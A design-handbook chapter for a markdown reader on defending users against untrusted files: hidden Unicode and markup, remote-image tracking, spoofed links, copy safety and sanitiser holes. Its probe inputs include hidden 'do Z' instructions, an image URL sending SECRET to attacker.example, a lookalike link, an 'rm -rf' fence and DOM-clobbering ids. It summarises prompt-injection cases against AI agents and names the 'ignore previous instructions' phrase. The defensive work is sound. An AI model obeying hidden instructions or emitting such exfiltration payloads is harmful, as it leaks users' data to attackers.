# Trust and safety for untrusted artifacts

*Agent output and third-party READMEs are untrusted input. Marxy is not a language model, so text cannot instruct Marxy; but people copy what they read into terminals and agents, instruction files are read by agents that see bytes a rendered view may hide, and every remote fetch is a read receipt. This chapter settles what a reader owes the person reading: show what is really there, quietly, and never fetch or execute. It proposes concrete treatments (glyph, place, contrast, what is summoned, notice text), grades each, and separates what needs no change to a frozen file from what does.*

Evidence grades: **[A]** replicated findings or a meta-analysis · **[B]** one well-designed study · **[C]** small, limited or mixed studies · **[D]** expert convention, or convergence of shipping tools, without a direct test · **[X]** contested or contradicted. Part of the [Reader Artifacts Handbook](README.md).

## The frame, and what the evidence does not say

Indirect prompt injection is the case where an attacker places instructions in data an LLM application later retrieves, blurring data and instructions **[C]** (abstract only, an attack demonstration).[^greshake] OWASP ranks prompt injection first in its 2025 list, notes that injected text need not be human-visible or readable, and admits it is unclear whether any prevention is fool-proof.[^owasp] None of this makes a *viewer* vulnerable. It makes a viewer a place where a human decides whether to trust a file, and the human's view is the only defence when the agent's view differs from it.

Two facts carry the whole chapter. First, **the human and the agent read different bytes.** Rehberger showed that Unicode tag characters (U+E0000–E007F) are usually not drawn at all, yet LLMs read them; he recommends filtering them at the application boundary.[^tags] Pillar Security demonstrated the same idea against rules files for coding assistants using zero-width joiners, bidirectional markers and other invisible characters; GitHub answered with a hidden-Unicode warning on 1 May 2025, Cursor maintained that the risk was the user's responsibility.[^pillar] (This is a vendor write-up of its own finding, so treat the vendors' positions as reported, not independently confirmed.) Second, **a rendered view shows less than the file.** Marxy's sanitiser removes comments and unknown elements together with their contents (below), so a rendered `AGENTS.md` can look clean while the buffer an agent reads does not.

What the evidence does *not* support is a reader that judges prose. See [Injection-looking prose](#injection-looking-prose-do-not-flag-it).

## Measured today (probes, reproducible)

> **Measured.** From a checkout with dependencies installed, `renderSafeHtml` from `packages/core/src/render/pipeline.ts` on small inputs (2026-09-25; harness output in `lab/data/probe-results.json`):
>
> - `a\n\n<!-- hidden: do Y -->\n\n<system>do Z</system>\n` renders `<p>a</p><p></p>`: the comment and the unknown element vanish with their contents. `removed` lists both; the comment is excluded from the notice by design (`docs/design/13-trust.md`: "not content").
> - `Please <system>do Z</system> thanks` renders `Please  thanks`. An XML-tagged prompt (`<instructions>…</instructions>`) loses its whole body (probe `prompt-xml-block`).
> - `[//]: # (hidden reference comment)` renders nothing and records **no removal at all**.
> - `<div style="display:none">agent-only text</div>` renders the text *visibly* (style dropped, `div` transparent): the human sees more than a browser would.
> - Tag characters (U+E0049 U+E0047 U+E004E), U+202E in prose and in a code fence, U+2066/U+2069, U+200B, U+200D, U+2060 and U+FEFF all reach the DOM unchanged and unmarked. `invisiblesReachingPage` in the probe for the tag-smuggling case lists all 31 code points.
> - `[https://apple.com](https://аpple.com)` (Cyrillic а) emits `href="https://xn--pple-43d.com/"` with the Latin-looking text unchanged. A link whose *text* is `https://github.com/acme/tool` pointing at `evil.example` renders with no indication.
> - `file:`, `vscode:`, `javascript:` (and `data:`) hrefs are removed and the anchor text stays as plain text; the removal is recorded. `./install.sh` is kept.
> - `![x](https://attacker.example/p.png?q=SECRET)` becomes `data-marxy-remote` carrying the full URL; `blockedImages` carries host and URL. Only `console.info("marxy: sanitiser removed N")` reports removals in the app today (`apps/desktop/src/app.ts` line 428); the notice of `docs/design/13-trust.md` is specified, not shipped.
> - Prose `--frozen-lockfile` renders `–frozen-lockfile`; `NAME="prod"` renders with a curly closing quote; the paragraph's last space becomes U+00A0; `<kbd>--help</kbd>` renders `<kbd>–help</kbd>`. Inline code and fenced code are untouched. Rendered-mode Mod+C first runs the first applicable `copy-*` operation on a click-selected node (a code block copies its source); on a drag selection it writes the selection text captured at pointer-up (`window.getSelection().toString()`; `apps/desktop/src/selection/view.ts`, `apply.ts`), i.e. the smartened DOM text.
> - `openExternal` is referenced only in `apps/desktop/src/shell/memory.ts` and `apps/desktop/src/selection/view.ts` (grep, 2026-09-25); no reviewed link-click path exists yet, so link policy below is design, not audit.

## 1. Hidden instructions: the byte gap

**Threat.** A file's bytes carry text the rendered page does not show: tag characters, zero-width and bidi controls, HTML comments, unknown elements, link reference definitions, `display:none` blocks (a browser hides them; Marxy does not). An agent reading the same file obeys what the human never saw.

**Evidence.** The attack is demonstrated against real tools (Greshake **[B]**, Rehberger, Pillar; all are attack demonstrations, none tests readers). No study was found that measures whether a marker in a viewer changes what people accept. GitHub's shipped warning and VS Code's default-on highlighting are the convergent design response **[D]** (two of two vendor surfaces examined here).

> **Default.** Marxy's job is a *truthful* view: every byte that changes what a consumer reads but not what a reader sees gets a mark. The mark set is small and fixed (sections 2 and 3). Text is never judged.
>
> **Operation.** `reveal-hidden` is a view lens (summoned by the palette, "Show hidden content"), not a splice: it toggles a class on the article that expands every hidden-content marker in place. It has no `replacement`. Applies to document. **[D]**
>
> **Marxy today.** No markers exist; the only report is a console line (`app.ts` ~428).

### Injection-looking prose: do not flag it

Should Marxy highlight sentences like "ignore previous instructions"? **No.** Liu et al. benchmarked five attacks and ten defences across ten models and seven tasks (USENIX Security 2024).[^liu] Nasr et al. (14 authors, arXiv 2025) report that adaptive attacks bypassed twelve recent defences with success above 90% for most **[C]** (abstract on the arXiv page; which of the twelve are detectors is not stated there).[^nasr] Liu et al.'s abstract reports the benchmark's scale, not a verdict on detectors, so it does not carry the recommendation. A flag that misses adaptive text teaches readers that unflagged means safe, and a flag that fires on a security README or on this handbook teaches them to ignore it. Marxy also cannot know which agent will read the text. Hidden *bytes* have no benign reading in an instruction file; visible sentences do. The recommendation rests on an inference from adjacent evidence, so it is **[D]**.

> **Trap.** A regex list of "jailbreak phrases" in the sanitiser or renderer: unfalsifiable, locale-bound, and a false assurance.

## 2. Invisible and bidirectional characters

**Threat.** Trojan Source: text whose logical order differs from its displayed order, so a reviewer sees one program and a compiler builds another. Boucher and Anderson demonstrate working attacks in C, C++, C#, JavaScript, Java, Rust, Go, Python, SQL, Bash, Assembly and Solidity, and describe a coordinated disclosure across compilers, editors and repositories **[C]** (attack demonstration; the two CVE numbers in the task lead were not on the abstract page and are not cited).[^trojan] Marxy's probe shows the override reaching both prose (`invoice‮fdp.exe`) and a JavaScript fence unmarked.

**What standards say.** UAX #9 says directional overrides are to be avoided where possible for security reasons and that isolates cannot affect text outside them.[^uax9] UTS #55 recommends that source-display tools give invisible characters optional, non-spacing visible representations, naming an overlaid bar for ZWJ/ZWNJ, an outline for variation selectors and small arrows for LRM/RLM, and suggests structuring display by directional isolates rather than inserting markers into the document.[^uts55] UTS #39 explicitly allows ZWJ and ZWNJ in limited contexts where they change rendering, for example Persian and Indic scripts.[^uts39]

**What shipping tools do (engineering facts).**

| Tool | Behaviour | Scope |
| --- | --- | --- |
| GitHub | warns on viewing a file that has bidirectional text; the warning may be ignored if intentional; shipped 31 Oct 2021[^ghbidi] | bidi only |
| VS Code | `editor.unicodeHighlight.invisibleCharacters` and `ambiguousCharacters` default to true; comments and strings included; `nonBasicASCII` false; its invisible list includes U+200B–U+200F, U+2028–U+202F, U+2060–U+2064, variation selectors, U+FEFF and the whole tag block U+E0000–E007F[^vscode] | broad |
| rustc | `text_direction_codepoint_in_literal` and `_in_comment` are deny-by-default; the nine flagged code points are the embeddings, overrides, isolates and their terminators[^rustc] | bidi controls; LRM/RLM not listed |
| GCC | `-Wbidi-chars` default `unpaired` (warn on unterminated bidi contexts); `any` warns on every use[^gcc] | bidi |

Convergence: bidi controls flagged by four of four; the wider invisible set by one of four, and only VS Code covers tag characters **[D]** (converged for bidi, 4 of 4 tools; not for tags). Only VS Code's approach fits a *reader*, because the others are compilers.

### Rules (what Marxy flags, and what it never does)

| Class | Code points | Flag? | Reason |
| --- | --- | --- | --- |
| Tag characters | U+E0000–E007F | **yes, always**; escalate | drawn as nothing, readable by models[^tags]; no legitimate use in prose or code known to me except emoji subdivision-flag sequences (base U+1F3F4, tags, then U+E007F), which I could **not verify** this session (UTS #51 fetch failed): treat a tag run attached to U+1F3F4 and terminated by U+E007F as unflagged only after checking that spec |
| Bidi embeddings, overrides | U+202A–202E | **yes**; escalate if unpaired | UAX #9: avoid; rustc and GCC agree |
| Bidi isolates | U+2066–2069 | **yes**; escalate if unpaired | same; legitimate but rare in authored files |
| Implicit marks | LRM U+200E, RLM U+200F, ALM U+061C | **no** | legitimate in bidi prose; UTS #55 wants only a light indicator, and only in source display |
| ZWJ / ZWNJ | U+200D, U+200C | **no** between emoji, or inside Persian/Indic sequences; **yes** elsewhere and always in code fences | UTS #39 contexts |
| ZWSP, word joiner, BOM | U+200B, U+2060, U+FEFF | **yes**, except U+FEFF at offset 0 | no reading benefit in prose; in an identifier they defeat search and review |
| Other C0/C1 controls, DEL | except TAB, LF, CR | **yes**, ESC (U+001B) escalated | copied into a terminal they act (section 6) |
| NBSP, soft hyphen | U+00A0, U+00AD | **no in prose; yes (NBSP) in code fences** | legitimate typography in prose; in a shell block NBSP silently breaks a command |
| Variation selectors | U+FE00–FE0F | **no** (emoji presentation) | not examined further; a payload channel via variation selectors is not verified here |

Grades: the *set* is **[D]** (converged: partial). The exceptions are engineering facts from UTS #39 and #55. Nothing here has been tested against readers.

### The marker

> **Default.** A flagged code point is drawn as a **1-character-wide inline mark in the article's code face, on the code ground colour, with the short name below-baseline**: `⟦ZWSP⟧`-shaped but built as one glyph box so the line does not reflow on toggle: hairline box, code face, 0.7 em label `202E` (hex) inside, colour `--marxy-*` warning role at ≥ 4.5:1 on ground and on selection (the handbook's floor). A run of tag characters collapses to **one** mark reading `tag ×31`; on summon (hover, or focus by keyboard) it decodes the payload into the code face (subtract U+E0000, printable ASCII only) so the reader can see the instruction that was hidden. At rest in a file with no flagged points there is nothing to see. **[D]** — reasoned from UTS #55 and VS Code; no reader test.
>
> The mark replaces the invisible *display*, never the byte: the code point stays in the buffer and in `data-marxy-s/e` provenance, and Source mode (CodeMirror 6) draws it too. **Neutralising bidi:** each bidi control sits in its own `unicode-bidi: isolate` span containing only that code point, so it reorders nothing and the displayed order equals the logical order. UAX #9 says characters inside an isolate cannot affect ordering outside it, and UTS #55 builds its display recommendation on isolates, but around lexical atoms rather than around each control; this is a variant of it, not its wording.
>
> **Measured.** Skeptic probe, 2026-09-25, WebKit 26.6 via Playwright (`webkit.launch`, headless), throwaway page: `ab \u202E gnp.exe \u202C end` laid out `gnp.exe` right-to-left (per-character x descending, 85 to 39). With each control in its own `<span style="unicode-bidi:isolate">` the same characters ran left-to-right, in logical order, also when the terminator was missing and with U+2066 in place of U+202E. Not tested: inside a `<pre>`/Shiki token span, in Source mode (CodeMirror), or in the shipping Tauri webview.
>
> **Operation.** `strip-invisible` — `string → string`, applies to span | block | section | document, offered only when the selection contains a flagged point; splices out flagged points (the rule table's "yes" rows), summary "Removed 31 hidden characters." One undo step; never writes to disk (ADR-0004). `escape-invisible` — the same rule set, replacing each point with `\u{202E}` text; offered beside it because deleting hides evidence and escaping keeps it. **[D]**
>
> **Marxy today.** None. Whether the frozen operation contract admits a new operation without an ADR is answered in `gaps`; `docs/design/13-trust.md` has no invisible-character clause.

> **Trap.** Normalising or stripping on load ("we cleaned it for you"). It breaks byte fidelity (commitment 4) and destroys the evidence of an attack. Also a trap: flagging everything non-ASCII (VS Code's `nonBasicASCII`, default off in that tool) in a reader whose users write in many scripts.

## 3. Hidden markup: the human sees less than the agent

**Threat.** The sanitiser is default-deny: an unknown element is removed *with its contents*, comments are dropped, `details` renders open. A prompt file using XML tags for structure loses its body; an instruction hidden in `<!-- -->` or an unknown `<tag>` is invisible in Rendered mode and fully visible to an agent that reads the file. `docs/design/13-trust.md` says comments "were never content," and for a README rendered on a website that is right. For instruction files it is wrong in effect: an agent treats the whole file as its context. A 2026 preprint reports that two models (DeepSeek-V3.2, GLM-4.5-Air) obeyed instructions in a hidden HTML comment appended to a Skill file, the raw text being passed verbatim **[C]** (abstract only, two models, one file type).[^hidden] Agents that strip comments were not surveyed; the safe assumption stays that some do not.

> **Default.** Two tiers. (a) **Notice at rest**, one line in `#marxy-notices`, only when the file contains removed hidden *content* (comment text, unknown-element contents, unreferenced link definitions) **and** is an instruction-class file (list owned by [chapter 02](02-agent-artifacts.md)), or contains any tag character or bidi override in any file: "This file has content Marxy does not show: 2 comments, 1 unknown tag, 31 hidden characters. [Reveal]". Same pattern as the existing blocked-image notice, dismissible, granting nothing. (b) **Reveal lens** in every file: markers appear in place, a 1 px rule in the left margin at the position of each removed comment or element with a `‹›`-shaped 1 ch label at its start, its text shown in the code face on demand. Elsewhere in ordinary READMEs the comment count is available in the lens only. **[D]**
>
> **Operation.** `reveal-hidden` (section 1). `copy-hidden-as-text` — `string → clipboard`, document; copies removed comments and unknown-element contents, one per line with line number, so the reader can paste them somewhere to inspect without executing them. **[D]**
>
> **Marxy today.** Removals are computed (`RenderResult.removed`, with island `src`) but comments carry only the reason "comments are not content"; link reference definitions record nothing; no notice, marker or lens exists.

**Unknown tags with contents.** Removing a tag *and its body* is the sanitiser's most consequential choice for agent files (probe `prompt-xml-block`: the whole prompt vanishes). The safer reader default is that no *text* ever disappears: render an unknown element's tags as literal escaped text in the code face and keep its children visible, as Source mode already shows them. That is a change to ADR-0009 §2 and to a CODEOWNERS-gated file (`/packages/core/src/sanitize/` is owned by `@inkstrata`), so it is a gap, not a default I can assert; the interim mitigation is the notice above. Conflicting consideration: `<script>`-like elements whose contents are code or data are already handled by the truncation notice in `docs/design/13-trust.md`, so a literal-text rule would apply only to elements outside `script`/`style` and friends.

## 4. Remote content is a read receipt

**Threat.** Markdown images are the canonical exfiltration channel: an injected instruction makes a model emit `![](https://attacker/x.png?q=DATA)`, and the client's automatic fetch delivers the data. Rehberger reported this against Bing Chat on 8 April 2023, fixed on 15 June 2023 by a CSP restricting images to Microsoft hosts.[^bing] The same mechanism, without a model, is a tracking pixel in a README.

**Marxy's design already answers most of it** (ADR-0027): the webview CSP has no `http(s)` source; consented images are fetched by one Rust function, `GET`, no cookies, no `Referer`, no redirects to another host, `https:` only, 10 MB, 10 s; consent is per document and per host. The ADR is honest that tracking pixels still work once a host is consented. What remains is what the notice *shows*.

> **Default.** The notice states the fact, plainly: "4 images from img.shields.io and github.com were not loaded." (per `docs/design/13-trust.md`), and the summoned **Details** list adds, per host: the count, the punycode form *and* Unicode form when they differ (already specified), and **whether any URL has a query string**, with its length ("2 have query strings, up to 44 characters"). Query text is not shown in the notice and is selectable in Details. The primary action loads **per host**, with checkboxes checked by default only for hosts that appear more than once in the document or serve no query strings; a host that is new, has a single image and a query string is unchecked. This split is a judgement without evidence, and it is evadable (an attacker can emit two images, or put the data in the path); treat it as a nudge, not a defence, and prefer all-unchecked if the reviewer finds the split confusing: it aims to make the exfil-shaped case (one image, long query, unfamiliar host) the one that needs a deliberate tick. **[D]**
>
> **Operation.** None mutating. The notice's Details is a lens over `blockedImages`.
>
> **Marxy today.** `blockedImages` already carries host and full URL (probe `image-exfil`); the notice, checkboxes and the Details list are specified in `docs/design/13-trust.md` and not built. No `Removal` field marks a query string; it is derivable from `url` without a contract change.

**Trap.** "Load all images" as a single global button: it turns a per-host decision into a habit. The design already refuses wildcards.

## 5. Links

**Threat.** Link text that names one destination while `href` names another; internationalised hosts that look like a trusted one; schemes that leave the reader's document (`file:`, `vscode:`, custom handlers).

**Evidence on whether readers can use a destination display.** The evidence for *passive* cues is poor. In Dhamija, Tygar and Hearst (22 participants, 20 sites) 23% did not look at browser cues at all and were wrong 40% of the time **[C]** (figures confirmed from the abstract summary; a 2006 lab study, not a document viewer).[^dhamija] Domain highlighting in the address bar gave some benefit but cannot be relied on alone (Lin et al., CHI 2011; **not read**: the ACM page returned 403 and only a search summary was seen, so grade **[C]**, held loosely; the finer claim in an earlier draft about participant types was unsupported and is removed).[^lin] A later two-experiment study (Xiong et al., *Human Factors* 2017) asks the same question and notes the earlier formal test confounded highlighting with instructions to look at the address bar; its result was not read here, so the direction is **[X]** until someone reads both.[^xiong] A large USENIX Security 2025 study (2,673 participants, phishing links in *emails*, abstract only) found that *active* URL-inspection tasks, such as picking, highlighting or retyping the domain, reduced phishing success, especially for typo-squatting, and attributes failure to inattentiveness rather than ignorance **[C]** (a different task from reading a document, and one that adds friction the reader forbids).[^lain] Together: showing the destination is expected and cheap, weak on its own, and stronger the more it forces attention. For a reader that must stay quiet, the practical reading is: show the destination when a mismatch exists and at the moment of action, and do not build friction into every link.

**IDNs.** Chrome shows punycode when scripts mix inappropriately, whole-script confusables appear outside the matching TLD, invisible characters occur, or the skeleton matches a top domain, else Unicode; the rule set builds on UTS #39.[^chrome] UTS #39 defines the skeleton and restriction levels.[^uts39] Marxy already emits the punycode href (the parser did it; probe `homoglyph-link`) but shows nothing.

> **Default.** (1) **Destination on summon:** focusing or hovering a link shows its destination in a one-line label under the link at the code face's small size, host set in the full-weight colour and path dimmed to no less than 4.5:1; punycode and Unicode forms both when they differ. Not shown at rest. (2) **Mismatch mark at rest:** if the link *text* parses as a URL or contains a dotted hostname and its host differs from the destination's host (after IDNA), append the destination host once, in the small label style, after the text: `https://github.com/acme/tool` ↗ `evil.example`. Ordinary "click here" text never gets one. (3) **Confusable text or destination:** a mixed-script host in link text, or an `xn--` destination host, gets the same appended host label with both forms. (4) **Removed schemes** (`file:`, `vscode:`, `javascript:`, `data:`): the anchor renders as plain text (today) and the reveal lens lists the removed target. No link that leaves Marxy ever opens in one click without showing a destination first. **[D]**
>
> **Operation.** `extract-links` (already a v1.1 candidate): `string → clipboard`, document, one `text → destination` per line, IDNs in both forms, so a reader can audit every link at once. **[D]**
>
> **Marxy today.** Punycode normalisation and scheme refusal are applied by the sanitiser; mismatch and confusable text are unmarked; no destination display or click-through path exists (see Measured).

**Trap.** Displaying the destination in the window's status line (browser convention): it adds chrome at rest and, per the phishing work above, readers do not use it.

## 6. Copy safety

**Pastejacking, and why Marxy is immune.** Pastejacking rewrites the clipboard with a script on a web page so a pasted command differs from the displayed one; the reference demo also shows that a newline in pasted text can execute a command in a terminal and that escape sequences can act inside an editor.[^paste] (The demo repository is GPL-3.0: prior art only, nothing to use.) A document cannot do this to Marxy: the sanitiser admits no script and no event handlers, and clipboard writes go through `shell.clipboardWrite` from an operation, not from page code. The residual risks are Marxy's own: what *it* puts on the clipboard, and what a person copies that they cannot see.

> **Default.** (1) **Copy is byte-exact.** Copying a source range yields the source bytes, including hidden characters. (2) **Say so when it matters:** if the range contains any flagged point from section 2, a transient one-line notice: "Copied text includes 31 hidden characters. [Copy without them]", using the `strip-invisible` transform on the clipboard only. (3) **Code blocks:** "copy code block clean" never appends a trailing newline to a single-line command, because a pasted newline can execute it. **Today it does the opposite**: `packages/core/src/operations/copy-code-clean.ts` `clipText` appends `\n` to any non-empty block that lacks one, so a one-line `rm -rf build` fence pastes with a newline. (4) **No smart typography in copied text, ever.** **[D]**
>
> **Operation.** `copy-without-invisible` — `string → clipboard`, span | block | section, offered when the range contains flagged points; the clipboard text is the strip transform's output, the buffer untouched (no `replacement`). `copy-as-plain-text` (already a v1.1 candidate) must resolve through provenance, not DOM text. **[D]**
>
> **Marxy today.** Smart typography is a render pass on markdown text nodes only (`packages/core/src/render/typography.ts`; probe: fences and inline code untouched) **but it also applies to text between raw-HTML `<kbd>` tags**, and Rendered-mode Mod+C, when no `copy-*` operation applies, writes the text captured from `window.getSelection().toString()` at pointer-up (`apps/desktop/src/selection/apply.ts` `runCopyShortcut`, `selection/view.ts` `onPointerUp`), which carries the en dashes, curly quotes and NBSP. A reader who copies `--frozen-lockfile` from a paragraph and pastes it into a shell gets `–frozen-lockfile`. This is a copy-fidelity bug with a safety edge and is recorded in `gaps`.

**ANSI and control characters.** ESC and other C0 controls in a *file* are content the reader should see marked (rule table) because a terminal will act on them when pasted; the demo above shows that escape sequences reach editors. Marxy renders them inert in the DOM; the mark exists so the human knows they are there.

## 7. Resource exhaustion (brief)

No study was found on document-viewer denial of service, and I ran no adversarial measurements. The relevant architecture facts: highlighting runs in a worker, so a pathological grammar match can be abandoned without freezing the page (per the shared brief; source not re-read); `fixtures/corpus/10-hostile.md` (113 lines) is the existing adversarial fixture; ADR-0032 forbids perf gates on the pull-request path. The defensible default is a **size and nesting guard with a visible notice**, not a silent truncation: when a file exceeds a stated budget the reader is offered Source mode. Numbers are unmeasured and belong in the perf record rather than here. **[D]**, with the honest caveat that no threshold in this chapter is evidence-backed.

## 8. The document as an attack surface for the reader itself

Sections 1 to 7 treat the reader as a place where a person is misled. A document can also aim at the reader's own machinery, and an independent read of the code raised four such holes. Each was reproduced on commit `d373abc` before it was kept here.

> **Measured.** Node 24, `packages/core` from source. (1) **A raw HTML island can claim a reserved id.** `sanitizeHtml('<h2 id="marxy-outline" data-marxy-s="0">x</h2>')` under the default policy returns `<h2 id="marxy-outline">x</h2>`; the same input without the `data-marxy-s` attribute loses the `id`. Through the full pipeline, a document with a footnote and an island `<h2 id="marxy-fn-1" data-marxy-s="0">` renders with `id="marxy-fn-1"`. The island pass honours the *public* provenance names, so the reserved-prefix rule that [ADR-0023](../../adr/0023-provenance-in-the-dom.md) and `docs/design/13-trust.md` describe is skipped for any tag that carries them. (2) **Ids that name page globals survive.** `<h2 id="cookie">` is kept, and `id="location"`-style names would shadow `window` and `document` properties by named access (DOM clobbering). (3) **Internal class names survive.** `class="marxy-katex"` is kept under the default policy, because the class allow-list admits any `marxy-[a-z-]{1,32}`. (4) **`copy-section` alters text in its clipboard HTML** (see [chapter 5](05-diffs-provenance.md#what-the-code-does-today-under-these-operations)).

None of the first three runs script. They let a hostile file take an id the reader's own lookups use (footnote anchors, future outline and find targets), pose as an internal component in a stylesheet, or shadow a global the app reads. The threat is real for the reason [ADR-0009](../../adr/0009-security-posture.md) gives, that a document is untrusted input to a program with file access, and the blast radius is set by what the webview may ask the shell to do.

> **Marxy today.** The webview's shell surface is wider than the sanitiser-and-CSP story implies. `apps/desktop/src-tauri/build.rs` is a bare `tauri_build::build()` with no app manifest, and `main.rs` registers eleven commands. `read_file(path)` reads any path it is given. The asset-scope command accepts any existing directory. The CSP is tight (`default-src 'none'`, no `http(s):` source), so today a hole in the sanitiser would need to become script before it could reach those commands, and the sanitiser is the one layer that stands between a hostile document and them. Whether Tauri 2 lets an unmanifested app command be called from the webview by default was **not verified** here; the investigator who raised it did not verify it either. Links are inert in the shipped app: `selection/view.ts` calls `openExternal` only if it exists, and the real shell does not implement it, so a click on any link does nothing (which fails closed). ADR-0027's remote-image consent is still `proposed`: there is no `fetchRemoteImage` in the Rust shell, so [section 4](#4-remote-content-is-a-read-receipt) describes a design, and the blocked-image notice has nothing behind its opt-in.

> **Default.** Refuse, in the island pass, any `id` or `name` beginning `marxy-` whatever attributes the tag carries; refuse the `marxy-` class prefix from documents (the renderer and highlighter emit their own, in the final pass); and refuse ids that name `window` or `document` members, or prefix all document ids. Grade: engineering, no evidence needed; the reproduction is the argument. Which of the three to do is a decision for the sanitiser's owners (it is a CODEOWNERS-gated path, ADR-0028), and the chapter's gap list carries it as one ADR-0009 amendment.

> **Operation.** None. This is a policy and a gate: a vector for each of the three cases in `vectors.test.ts`, and a check that runs `tauri.conf.json`'s CSP string against the no-network gate's own list, since the corpus gate runs in Playwright WebKit and not against the shipped webview's CSP.

## What ships first

1. The notice line for hidden content and the reveal lens (sections 1, 3): read-only, no contract change.
2. The invisible-character mark with the tag-run decode and bidi isolation (section 2): needs registry entries and a WebKit probe.
3. The mismatch host label and destination-on-summon (section 5).
4. Copy: exact bytes, warn on hidden, no smart typography in copy (section 6).
5. A decision on unknown-element removal (section 3) as an ADR-0009 amendment.

[^greshake]: Greshake, Abdelnabi, Mishra, Endres, Holz, Fritz, "Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection", arXiv cs.CR (AISec 2023 venue **not confirmed on the page fetched**), 2023 (abstract only). [arxiv.org/abs/2302.12173](https://arxiv.org/abs/2302.12173). Accessed 2026-09-25.
[^owasp]: OWASP GenAI Security Project, "LLM01:2025 Prompt Injection", OWASP Top 10 for LLM Applications 2025 (docs page). [genai.owasp.org/llmrisk/llm01-prompt-injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/). Accessed 2026-09-25.
[^pillar]: Pillar Security, "New Vulnerability in GitHub Copilot and Cursor: How Hackers Can Weaponize Code Agents" (Rules File Backdoor), 2025 (vendor blog, read in full as summarised by the fetch tool). [pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents). Accessed 2026-09-25.
[^tags]: Rehberger, "Hiding and finding text with Unicode tags", *Embrace The Red* blog, 2024 (docs page). [embracethered.com/blog/posts/2024/hiding-and-finding-text-with-unicode-tags](https://embracethered.com/blog/posts/2024/hiding-and-finding-text-with-unicode-tags/). Accessed 2026-09-25.
[^liu]: Liu, Jia, Geng, Jia, Gong, "Formalizing and Benchmarking Prompt Injection Attacks and Defenses", *USENIX Security Symposium* 2024 (abstract only). [arxiv.org/abs/2310.12815](https://arxiv.org/abs/2310.12815). Accessed 2026-09-25.
[^nasr]: Nasr, Carlini, Sitawarin et al., "The Attacker Moves Second: Stronger Adaptive Attacks Bypass Defenses Against LLM Jailbreaks and Prompt Injections", arXiv 2510.09023, 2025 (abstract only, read on the arXiv page). [arxiv.org/abs/2510.09023](https://arxiv.org/abs/2510.09023). Accessed 2026-09-25.
[^trojan]: Boucher, Anderson, "Trojan Source: Invisible Vulnerabilities", *USENIX Security Symposium* (32nd), 2023 (abstract only). [arxiv.org/abs/2111.00169](https://arxiv.org/abs/2111.00169). Accessed 2026-09-25.
[^uax9]: Unicode Consortium, "UAX #9: Unicode Bidirectional Algorithm" (spec, sections on explicit formatting and security). [unicode.org/reports/tr9](https://www.unicode.org/reports/tr9/). Accessed 2026-09-25.
[^uts39]: Unicode Consortium, "UTS #39: Unicode Security Mechanisms" (spec: restriction levels, confusables, ZWJ/ZWNJ contexts). [unicode.org/reports/tr39](https://www.unicode.org/reports/tr39/). Accessed 2026-09-25.
[^uts55]: Unicode Consortium, "UTS #55: Unicode Source Code Handling" (spec: recommendations for display tools). [unicode.org/reports/tr55](https://www.unicode.org/reports/tr55/). Accessed 2026-09-25.
[^ghbidi]: GitHub, "Warning about bidirectional Unicode text", GitHub Changelog, 2021-10-31 (docs page). [github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text](https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/). Accessed 2026-09-25.
[^vscode]: Microsoft, VS Code `src/vs/editor/common/config/editorOptions.ts` (unicodeHighlight defaults) and `src/vs/base/common/strings.ts` (InvisibleCharacters), main branch (source). [github.com/microsoft/vscode](https://github.com/microsoft/vscode). MIT. Accessed 2026-09-25.
[^rustc]: The rustc book, "Deny-by-default lints: text_direction_codepoint_in_literal / _in_comment" (docs page). [doc.rust-lang.org/rustc/lints/listing/deny-by-default.html](https://doc.rust-lang.org/rustc/lints/listing/deny-by-default.html). Accessed 2026-09-25.
[^gcc]: GNU Project, "Options to Request or Suppress Warnings: -Wbidi-chars", *GCC manual* (docs page). [gcc.gnu.org/onlinedocs/gcc/Warning-Options.html](https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html). Accessed 2026-09-25.
[^bing]: Rehberger, "Bing Chat: Data Exfiltration Exploit Explained", *Embrace The Red* blog, 2023 (docs page). [embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix](https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/). Accessed 2026-09-25.
[^dhamija]: Dhamija, Tygar, Hearst, "Why Phishing Works", *Proc. CHI* 2006, pp. 581–590 (abstract only, via search result; the 22, 20, 23% and 40% figures match the abstract summary). [dl.acm.org/doi/10.1145/1124772.1124861](https://dl.acm.org/doi/10.1145/1124772.1124861). Accessed 2026-09-25.
[^lin]: Lin, Greenberg, Trotter, Ma, Aycock, "Does domain highlighting help people identify phishing sites?", *Proc. CHI* 2011, pp. 2075–2084 (not read: search-result summary only; ACM, ResearchGate and Semantic Scholar pages returned 403 or no text). [dl.acm.org/doi/10.1145/1978942.1979244](https://dl.acm.org/doi/10.1145/1978942.1979244). Accessed 2026-09-25.
[^lain]: Lain, Nakatsuka, Kostiainen, Tsudik, Capkun, "URL Inspection Tasks: Helping Users Detect Phishing Links in Emails", *USENIX Security* 2025 (abstract only). [arxiv.org/abs/2502.20234](https://arxiv.org/abs/2502.20234). Accessed 2026-09-25.
[^chrome]: Chromium project, "IDN in Google Chrome" display policy (docs page). [chromium.googlesource.com/chromium/src/+/main/docs/idn.md](https://chromium.googlesource.com/chromium/src/+/main/docs/idn.md). Accessed 2026-09-25.
[^paste]: Ayrey (dxa4481), "Pastejacking" demo repository README, 2016 (docs page; GPL-3.0, prior art only). [github.com/dxa4481/Pastejacking](https://github.com/dxa4481/Pastejacking). Accessed 2026-09-25.
[^xiong]: Xiong, Proctor, Yang, Li, "Is Domain Highlighting Actually Helpful in Identifying Phishing Web Pages?", *Human Factors* 59(4):640–660, 2017 (abstract only, via search summary; results not seen). [journals.sagepub.com/doi/10.1177/0018720816684064](https://journals.sagepub.com/doi/10.1177/0018720816684064). Accessed 2026-09-25.
[^hidden]: "When Skills Lie: Hidden-Comment Injection in LLM Agents", arXiv 2602.10498, 2026 (abstract only). [arxiv.org/abs/2602.10498](https://arxiv.org/abs/2602.10498). Accessed 2026-09-25.
